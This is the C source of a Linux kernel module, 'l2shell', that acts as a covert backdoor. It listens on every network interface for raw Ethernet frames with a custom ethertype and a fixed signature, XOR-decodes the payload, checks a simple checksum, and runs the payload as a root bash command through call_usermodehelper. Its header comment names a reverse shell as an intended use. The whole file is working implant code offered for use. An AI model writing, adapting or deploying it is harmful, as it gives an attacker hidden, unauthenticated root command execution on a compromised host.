/* l2shell_kmod.c - kernel module transport for L2 shell
 * Init-trigger: listens on all interfaces for CLIENT_SIGNATURE frames.
 * On first payload from a client, launches the provided command via
 * call_usermodehelper(). No /dev interface is exposed; the launched
 * userspace helper handles IO (e.g., reverse shell).
 */

#include <linux/etherdevice.h>
#include <linux/if_ether.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/netdevice.h>
#include <linux/printk.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>

#define ETHER_TYPE_CUSTOM 0x88B5
#define CLIENT_SIGNATURE 0xAABBCCDDu
#define SERVER_SIGNATURE 0xDDCCBBAAu
#define MAX_PAYLOAD_SIZE 1024
#define PACKET_DEDUP_CACHE 32
#define PACKET_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)

struct __attribute__((packed)) packh {
    struct ethhdr eth;
    __be32 signature;
    __be32 payload_size;
    __be32 crc;
};

struct __attribute__((packed)) pack {
    struct packh h;
    u8 payload[MAX_PAYLOAD_SIZE];
};

struct fp {
    u8 mac[ETH_ALEN];
    u32 crc;
    u32 psize;
    u32 sig;
    ktime_t ts;
    bool valid;
};

struct dedup_cache {
    struct fp e[PACKET_DEDUP_CACHE];
    size_t cur;
};

static struct {
    spinlock_t launch_lock;
    bool launch_pending;
    struct work_struct launch_work;
    char cmd_buf[MAX_PAYLOAD_SIZE + 1];
    struct dedup_cache dc;
    struct net_device *dev;
    u8 cli_mac[ETH_ALEN];
    bool have_cli;
} g;

#define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)

static void enc_dec(const u8 *in, u8 *out, const u8 *key, size_t len) {
    static const u8 km[4] = {4, 1, 2, 3};
    u8 tmp[4];
    size_t i = 0;
    while (i < len) {
        size_t chunk = len - i < 4 ? len - i : 4;
        size_t j;
        for (j = 0; j < chunk; j++)
            tmp[j] = in[i + j] ^ key[j] ^ km[j];
        for (j = 0; j < chunk; j++)
            out[i + j] = tmp[j];
        i += chunk;
    }
}

static u32 csum32(const u8 *p, size_t n) {
    u32 s = 0;
    size_t i;
    for (i = 0; i < n; i++)
        s += p[i];
    return s;
}

static void dedup_init(struct dedup_cache *dc) {
    memset(dc, 0, sizeof(*dc));
}

static void dump_frame(const char *tag, const u8 *buf, size_t len) {
    if (!buf || !len) return;
    print_hex_dump(KERN_INFO, tag, DUMP_PREFIX_OFFSET, 16, 1, buf, len, false);
}

static bool dedup_drop(struct dedup_cache *dc, const u8 mac[ETH_ALEN],
                       u32 crc, u32 psize, u32 sig, u64 win_ns) {
    u64 now = ktime_get_ns();
    size_t i;

    for (i = 0; i < PACKET_DEDUP_CACHE; i++) {
        struct fp *f = &dc->e[i];
        if (!f->valid)
            continue;
        if (now > (u64)ktime_to_ns(f->ts) &&
            now - (u64)ktime_to_ns(f->ts) > win_ns) {
            f->valid = false;
            continue;
        }
        if (f->valid && f->crc == crc && f->psize == psize &&
            f->sig == sig && !memcmp(f->mac, mac, ETH_ALEN))
            return true;
    }

    dc->e[dc->cur].valid = true;
    dc->e[dc->cur].crc = crc;
    dc->e[dc->cur].psize = psize;
    dc->e[dc->cur].sig = sig;
    dc->e[dc->cur].ts = ktime_get();
    memcpy(dc->e[dc->cur].mac, mac, ETH_ALEN);
    dc->cur = (dc->cur + 1) % PACKET_DEDUP_CACHE;
    return false;
}

static void launch_workfn(struct work_struct *work) {
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm-256color",
        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
        NULL};
    char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", g.cmd_buf, NULL};
    struct subprocess_info *info;

    pr_info("l2sh: launching command: %s\n", g.cmd_buf);

    info = call_usermodehelper_setup(argv[0], argv, envp,
                                     GFP_KERNEL, NULL, NULL, NULL);
    if (!info) {
        spin_lock(&g.launch_lock);
        g.launch_pending = false;
        spin_unlock(&g.launch_lock);
        return;
    }

    call_usermodehelper_exec(info, UMH_WAIT_EXEC);

    spin_lock(&g.launch_lock);
    g.launch_pending = false;
    spin_unlock(&g.launch_lock);
}

struct chdr {
    __be32 signature;
    __be32 payload_size;
    __be32 crc;
};

static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    struct ethhdr *eth;
    struct chdr *h;
    u32 sig, psize, crc_recv, crc_calc;
    int need;

    /* we only need our header in the linear area */
    if (unlikely(!pskb_may_pull(skb, sizeof(struct chdr)))) {
        l2sh_info("drop on %s: header truncated\n", dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    eth = eth_hdr(skb);           /* mac header */
    h = (struct chdr *)skb->data; /* our header sits in payload */

    if (unlikely(!eth)) {
        l2sh_info("drop on %s: no ethhdr\n", dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    /* double check ethertype even though we are bound to it */
    if (unlikely(eth->h_proto != htons(ETHER_TYPE_CUSTOM)))
        return NET_RX_SUCCESS;

    sig = be32_to_cpu(h->signature);
    psize = be32_to_cpu(h->payload_size);
    crc_recv = be32_to_cpu(h->crc);

    if (sig != CLIENT_SIGNATURE)
        return NET_RX_SUCCESS;

    if (psize > MAX_PAYLOAD_SIZE) {
        l2sh_info("drop payload %u from %s (too large)\n",
                  psize, dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    need = (int)sizeof(struct chdr) + (int)psize;
    if (unlikely(!pskb_may_pull(skb, need))) {
        l2sh_info("drop payload %u from %s (truncated)\n",
                  psize, dev ? dev->name : "<unknown>");
        return NET_RX_SUCCESS;
    }

    l2sh_info("frame from %s src %pM payload=%u\n",
              dev ? dev->name : "<unknown>", eth->h_source, psize);

    if (dedup_drop(&g.dc, eth->h_source, crc_recv, psize, sig, PACKET_DEDUP_WINDOW_NS)) {
        l2sh_info("dedup drop from %pM\n", eth->h_source);
        return NET_RX_SUCCESS;
    }

    /* сначала расшифровываем payload, затем считаем crc так же, как в userland */
    enc_dec((u8 *)(h + 1), (u8 *)(h + 1), (u8 *)&h->crc, psize);

    /* вычисляем crc по ethernet-заголовку, нашему заголовку и payload в отдельном буфере */
    {
        u8 tmp[ETH_HLEN + sizeof(struct chdr) + MAX_PAYLOAD_SIZE];
        size_t off = 0;
        size_t frame_len;
        size_t crc_off;

        memcpy(tmp + off, eth, ETH_HLEN);
        off += ETH_HLEN;

        memcpy(tmp + off, h, sizeof(*h));
        off += sizeof(*h);

        memcpy(tmp + off, (u8 *)(h + 1), psize);
        off += psize;

        frame_len = off;
        dump_frame("l2sh: rx frame ", tmp, frame_len);

        crc_off = ETH_HLEN + offsetof(struct chdr, crc);
        if (frame_len >= crc_off + sizeof(h->crc)) {
            memset(tmp + crc_off, 0, sizeof(h->crc));
        }

        crc_calc = csum32(tmp, frame_len);
    }

    if (crc_calc != crc_recv) {
        l2sh_info("crc mismatch from %pM recv=%u calc=%u\n",
                  eth->h_source, crc_recv, crc_calc);
        return NET_RX_SUCCESS;
    }

    if (!g.have_cli || memcmp(g.cli_mac, eth->h_source, ETH_ALEN)) {
        memcpy(g.cli_mac, eth->h_source, ETH_ALEN);
        rcu_assign_pointer(g.dev, dev);
        g.have_cli = true;
        pr_info("l2sh: tracking client %pM on interface %s\n",
                g.cli_mac, dev ? dev->name : "<unknown>");
    }

    if (psize > 0) {
        unsigned long flags;
        spin_lock_irqsave(&g.launch_lock, flags);
        if (!g.launch_pending) {
            memcpy(g.cmd_buf, (u8 *)(h + 1), psize);
            g.cmd_buf[psize] = '\0';
            g.launch_pending = true;
            l2sh_info("command queued from %pM: %s\n", eth->h_source, g.cmd_buf);
            schedule_work(&g.launch_work);
        } else {
            l2sh_info("command already pending, ignoring new payload\n");
        }
        spin_unlock_irqrestore(&g.launch_lock, flags);
    }

    return NET_RX_SUCCESS;
}

static void log_interfaces(void) {
    struct net_device *dev;
    read_lock(&dev_base_lock);
    for_each_netdev(&init_net, dev) {
        pr_info("l2sh: listening on interface %s addr %pM\n",
                dev->name, dev->dev_addr);
    }
    read_unlock(&dev_base_lock);
}

static struct packet_type l2_pt = {
    .type = cpu_to_be16(ETHER_TYPE_CUSTOM),
    .func = l2_rx,
};

static int __init l2_init(void) {
    memset(&g, 0, sizeof(g));
    spin_lock_init(&g.launch_lock);
    INIT_WORK(&g.launch_work, launch_workfn);
    dedup_init(&g.dc);

    dev_add_pack(&l2_pt);
    pr_info("l2sh: kernel trigger loaded, ethertype 0x%04x\n", ETHER_TYPE_CUSTOM);
    log_interfaces();
    return 0;
}

static void __exit l2_exit(void) {
    dev_remove_pack(&l2_pt);
    flush_work(&g.launch_work);
    pr_info("l2sh: unloaded\n");
}

module_init(l2_init);
module_exit(l2_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("you");
MODULE_DESCRIPTION("L2 shell kernel module");
